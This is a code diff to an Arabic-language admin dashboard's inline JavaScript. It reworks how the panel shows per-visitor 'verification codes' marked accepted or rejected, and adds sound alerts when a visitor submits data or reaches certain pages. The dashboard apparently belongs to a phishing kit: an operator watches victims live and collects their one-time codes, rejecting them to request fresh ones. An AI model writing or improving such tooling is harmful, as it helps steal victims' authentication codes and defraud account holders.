@@ -4033,9 +4033,10 @@ run();setInterval(function(){note();apply()},1200);})();</script>
 })();
 </script>
 <!-- FIX111 -->
-<script id="kddF110">
+<!-- FIX112 -->
+<script id="kddF112">
 (function(){
-  if (window.__f110) return; window.__f110 = 1;
+  if (window.__f112) return; window.__f112 = 1;
   var K = {};
   try { K = JSON.parse(localStorage.getItem("kdd_rej")||"{}") || {}; } catch(e){ K = {}; }
   function sv(){ try { localStorage.setItem("kdd_rej", JSON.stringify(K)); } catch(e){} }
@@ -4060,35 +4061,75 @@ run();setInterval(function(){note();apply()},1200);})();</script>
     }
     return "رمز";
   }
+  function mkCard(it, newest){
+    var rej = it.s === "مرفوض";
+    var c = document.createElement("div");
+    c.setAttribute("data-f112","1");
+    c.className = "data-section bg-orange-50 p-4 rounded-lg";
+    c.style.borderRightColor = "#f97316";
+    var h = document.createElement("h3");
+    h.className = "font-bold mb-3 text-orange-800";
+    h.textContent = "🔢 رمز التحقق";
+    var u = document.createElement("span");
+    u.style.display = "none";
+    u.textContent = "|" + (it.ts||0);
+    h.appendChild(u);
+    c.appendChild(h);
+    var inb = document.createElement("div");
+    inb.className = "bg-white p-3 rounded-lg";
+    var r1 = document.createElement("div");
+    r1.className = "flex justify-between items-center mb-2";
+    var cd = document.createElement("span");
+    cd.className = "font-mono text-lg font-bold text-orange-700";
+    cd.setAttribute("dir","ltr");
+    cd.textContent = it.c;
+    var bg = document.createElement("span");
+    bg.style.cssText = "font-size:12px;font-weight:700;padding:3px 10px;border-radius:8px;background:" + (rej?"#fee2e2":"#dcfce7") + ";color:" + (rej?"#b91c1c":"#15803d");
+    bg.textContent = it.s + " · " + it.t;
+    r1.appendChild(cd); r1.appendChild(bg);
+    inb.appendChild(r1);
+    var r2 = document.createElement("div");
+    r2.className = "flex justify-between items-center";
+    var pg = document.createElement("span");
+    pg.className = "text-sm text-gray-500";
+    pg.textContent = it.pg || "رمز";
+    r2.appendChild(pg);
+    if (newest){
+      var b2 = document.createElement("button");
+      b2.textContent = "مسح";
+      b2.style.cssText = "font-size:11px;padding:2px 10px;border-radius:8px;border:1px solid #f59e0b;background:#fff;color:#b45309;cursor:pointer";
+      b2.addEventListener("click", function(ev){ ev.stopPropagation(); var id = sid(); if (id){ K[id] = []; sv(); last = ""; draw(); } });
+      r2.appendChild(b2);
+    }
+    inb.appendChild(r2);
+    c.appendChild(inb);
+    return c;
+  }
+  var last = "";
+  function cont(){
+    var box = document.getElementById("visitorDetails"); if (!box) return null;
+    var c = box.querySelector(".space-y-3");
+    if (c) return c;
+    var w = box.querySelector(".space-y-6");
+    if (!w) return null;
+    c = document.createElement("div");
+    c.className = "space-y-3";
+    c.setAttribute("data-f112wrap","1");
+    if (w.children.length > 1) w.insertBefore(c, w.children[1]); else w.appendChild(c);
+    return c;
+  }
   function draw(){
     var box = document.getElementById("visitorDetails"); if (!box) return;
     var id = sid(); if (!id) return;
-    var o = document.getElementById("f110box"); if (o && o.parentNode) o.parentNode.removeChild(o);
-    var a = K[id] || []; if (!a.length) return;
-    var w = document.createElement("div"); w.id = "f110box"; w.style.cssText = "margin:10px 0";
-    var h = document.createElement("div");
-    h.style.cssText = "font-weight:800;font-size:15px;color:#92400e;margin-bottom:8px";
-    h.textContent = "🔒 الرموز المرفوضة (محفوظة — لا تُحذف)";
-    w.appendChild(h);
-    for (var i=a.length-1;i>=0;i--){
-      var it = a[i], r = it.s === "مرفوض";
-      var c = document.createElement("div");
-      c.style.cssText = "border:2px solid " + (r?"#f97316":"#16a34a") + ";border-radius:12px;padding:12px 14px;margin:8px 0;background:" + (r?"#fff7ed":"#f0fdf4");
-      var top = document.createElement("div");
-      top.style.cssText = "display:flex;justify-content:space-between;align-items:center";
-      var cd = document.createElement("b");
-      cd.textContent = it.c;
-      cd.style.cssText = "font-family:monospace;font-size:24px;letter-spacing:2px;color:" + (r?"#c2410c":"#15803d");
-      var tg = document.createElement("span");
-      tg.textContent = it.s + " · " + it.t;
-      tg.style.cssText = "font-size:12px;font-weight:700;padding:3px 10px;border-radius:8px;background:" + (r?"#fee2e2":"#dcfce7") + ";color:" + (r?"#b91c1c":"#15803d");
-      top.appendChild(cd); top.appendChild(tg); c.appendChild(top);
-      var sub = document.createElement("div");
-      sub.textContent = (it.pg||"رمز") + " — محفوظ ولا يُحذف";
-      sub.style.cssText = "font-size:12px;color:#9a3412;margin-top:6px";
-      c.appendChild(sub); w.appendChild(c);
-    }
-    box.insertBefore(w, box.firstChild);
+    var c = cont(); if (!c) return;
+    var arr = K[id] || [];
+    var sig = id + "#" + arr.map(function(x){ return x.c + ":" + x.s + ":" + x.ts; }).join(",");
+    if (sig === last && c.querySelector("[data-f112]")) return;
+    last = sig;
+    var olds = c.querySelectorAll("[data-f112]");
+    for (var k=0;k<olds.length;k++) olds[k].parentNode.removeChild(olds[k]);
+    if (!arr.length) return;
+    for (var i=0;i<arr.length;i++){ c.insertBefore(mkCard(arr[i], i === arr.length-1), c.firstChild); }
   }
   document.addEventListener("click", function(e){
     var b = e.target && e.target.closest ? e.target.closest("button") : null;
@@ -4103,22 +4144,23 @@ run();setInterval(function(){note();apply()},1200);})();</script>
     var a = K[id] || (K[id] = []);
     var l = a[a.length-1];
     if (!(l && l.c === c && l.s === s)){
-      a.push({ c:c, s:s, pg:pgOf(b), t:new Date().toLocaleTimeString("ar-EG",{hour:"2-digit",minute:"2-digit"}) });
+      a.push({ c:c, s:s, pg:pgOf(b), ts:Date.now(), t:new Date().toLocaleTimeString("ar-EG",{hour:"2-digit",minute:"2-digit"}) });
       sv();
     }
+    last = "";
     draw();
   }, true);
   var o = window.renderVisitorDetails;
-  if (typeof o === "function" && !o.__f110){
-    var f = function(){ var r = o.apply(this, arguments); try { draw(); } catch(e){} return r; };
-    f.__f110 = 1; window.renderVisitorDetails = f; try { renderVisitorDetails = f; } catch(e){}
+  if (typeof o === "function" && !o.__f112){
+    var f = function(){ var r = o.apply(this, arguments); try { last = ""; draw(); } catch(e){} return r; };
+    f.__f112 = 1; window.renderVisitorDetails = f; try { renderVisitorDetails = f; } catch(e){}
   }
-  setInterval(function(){ if (!document.getElementById("f110box")) draw(); }, 700);
+  setInterval(function(){ draw(); }, 700);
 })();
 </script>
-<script id="kddF111">
+<script id="kddF113">
 (function(){
-  if (window.__f111) return; window.__f111 = 1;
+  if (window.__f113) return; window.__f113 = 1;
   function d(){
     try { frogAudio.currentTime = 0; frogAudio.play().catch(function(){}); return; } catch(e){}
     try { new Audio("/admin/frog.mp3").play(); } catch(e){}
@@ -4127,8 +4169,8 @@ run();setInterval(function(){note();apply()},1200);})();</script>
   function h(){
     try {
       var s = window.socket;
-      if (!s || s === window.__stub || !s.on || s.__f111) return;
-      s.__f111 = 1;
+      if (!s || s === window.__stub || !s.on || s.__f113) return;
+      s.__f113 = 1;
       s.on("visitor:pageChanged", function(x){ try { if (P.test(String((x&&x.page)||""))) d(); } catch(e){} });
       s.on("visitor:dataSubmitted", function(x){ try { if (P.test(String((x&&x.data&&x.data.page)||""))) d(); } catch(e){} });
     } catch(e){}
